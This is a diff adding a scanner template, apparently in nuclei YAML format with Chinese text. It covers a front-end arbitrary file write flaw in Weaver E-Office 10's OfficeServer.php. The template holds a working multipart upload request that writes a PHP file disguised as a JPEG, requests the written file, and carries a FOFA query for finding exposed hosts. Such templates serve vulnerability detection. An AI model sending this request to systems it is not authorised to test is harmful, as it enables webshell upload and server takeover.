@@ -1,0 +1,49 @@
+id: 泛微E-Office OfficeServer.php 文件上传漏洞
+time:  "2022-12-08"
+
+info:
+  name: 泛微KtreeUploadAction
+  severity: high
+  description: 泛微eoffice 10版本存在前台任意文件写入漏洞，攻击者可通过该漏洞上传webshell获取服务器权限。
+  reference: 暂无
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="泛微-EOffice"
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
+      - "{{BaseURL}}/eoffice10/server/public/iWebOffice2015/Document/test.php"
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=----WebKitFormBoundaryqhUtBPRUeNb5pjit & Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 &  Accept-Encoding:gzip, deflate & Upgrade-Insecure-Requests:1 & Origin:null
+        
+    body: 
+      - |
+        ------WebKitFormBoundaryqhUtBPRUeNb5pjit
+        Content-Disposition: form-data; name="FileData"; filename="1.jpg"
+        Content-Type: image/jpeg
+
+        ik521<?php phpinfo();?>
+        ------WebKitFormBoundaryqhUtBPRUeNb5pjit
+        Content-Disposition: form-data; name="FormData"
+
+        {'USERNAME':'','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test.php'}
+        ------WebKitFormBoundaryqhUtBPRUeNb5pjit--
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "ik521"
+
+      - type: status
+        status:
+          - 200
+    
